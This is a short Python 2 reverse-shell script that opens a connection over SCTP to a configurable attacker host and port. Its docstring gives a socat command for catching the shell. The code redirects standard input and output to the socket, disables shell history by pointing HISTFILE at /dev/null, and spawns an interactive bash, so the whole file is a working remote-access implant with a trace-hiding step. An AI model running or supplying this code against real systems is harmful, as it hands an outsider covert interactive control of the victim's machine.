#!/usr/bin/python2
"""
Reverse Connect SCTP PTY Shell - testing version

For an excellent listener use the following socat command:
socat file:`tty`,echo=0,raw sctp-listen:PORT

Alternatively, use sctp_pty_shell_handler.py 
"""
import os
import pty
import socket
from sctp import *

lhost = "XX.YY.ZZ.OO" # XXX: CHANGEME
lport = 42841 # XXX: CHANGEME

def main():
    s = sctpsocket_tcp(socket.AF_INET)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
	
if __name__ == "__main__":
    main()